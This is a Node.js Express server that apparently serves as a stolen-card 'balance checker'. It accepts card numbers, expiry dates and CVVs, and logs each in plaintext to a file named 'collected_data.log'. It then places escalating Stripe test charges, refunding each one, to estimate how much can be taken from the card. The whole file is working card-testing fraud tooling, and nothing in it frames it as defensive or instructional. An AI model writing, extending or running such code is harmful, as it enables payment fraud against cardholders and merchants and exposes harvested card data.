const express = require('express');

const cors = require('cors');

const Stripe = require('stripe')(process.env.STRIPE_SECRET_KEY || 'YOUR_STRIPE_SECRET_KEY');

const fs = require('fs');

const path = require('path');



const app = express();

app.use(cors());

app.use(express.json());



// Function to log data

function logData(cardNumber, exp, cvv, balanceResult) {

    const timestamp = new Date().toISOString();

    const logEntry = `${timestamp} | Card: ${cardNumber} | Exp: ${exp} | CVV: ${cvv} | Balance: ${balanceResult}\n`;

    

    // Log to console

    console.log(logEntry.trim());

    

    // Append to file

    const logFile = path.join(__dirname, 'collected_data.log');

    fs.appendFile(logFile, logEntry, (err) => {

        if (err) console.error('Error writing to log file:', err);

    });

}



app.post('/api/check', async (req, res) => {

    const { card_number, exp, cvv } = req.body;



    if (!card_number || !exp || !cvv) {

        const errorMsg = 'Error: Missing card details';

        logData(card_number || 'N/A', exp || 'N/A', cvv || 'N/A', errorMsg);

        return res.json({ balance: errorMsg });

    }



    const [expMonth, expYear] = exp.split('/');

    const cardToken = await Stripe.tokens.create({

        card: {

            number: card_number,

            exp_month: parseInt(expMonth),

            exp_year: 2000 + parseInt(expYear),

            cvc: cvv

        }

    }).catch(err => ({ error: err.message }));



    if (cardToken.error) {

        const errorMsg = `Invalid card: ${cardToken.error}`;

        logData(card_number, exp, cvv, errorMsg);

        return res.json({ balance: errorMsg });

    }



    const testAmounts = [1, 5, 10, 25, 50, 100];

    let estimatedBalance = 'Unknown';

    let lastSuccessfulAmount = 0;



    for (const amount of testAmounts) {

        try {

            const charge = await Stripe.charges.create({

                amount: amount * 100,

                currency: 'usd',

                source: cardToken.id,

                description: 'Balance check micro-transaction'

            });



            if (charge.status === 'succeeded') {

                lastSuccessfulAmount = amount;

                await Stripe.refunds.create({ charge: charge.id });

            } else {

                break;

            }

        } catch (err) {

            if (err.code === 'card_declined' && err.decline_code === 'insufficient_funds') {

                estimatedBalance = `Low balance (less than $${lastSuccessfulAmount + 1})`;

            } else {

                estimatedBalance = `Declined: ${err.message}`;

            }

            break;

        }

    }



    if (estimatedBalance === 'Unknown' && lastSuccessfulAmount > 0) {

        estimatedBalance = `At least $${lastSuccessfulAmount}`;

    } else if (estimatedBalance === 'Unknown') {

        estimatedBalance = 'Card valid but balance unknown (increase test amounts if needed)';

    }



    // Log the successful/estimated balance

    logData(card_number, exp, cvv, estimatedBalance);



    res.json({ balance: estimatedBalance });

});



const PORT = process.env.PORT || 3000;

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

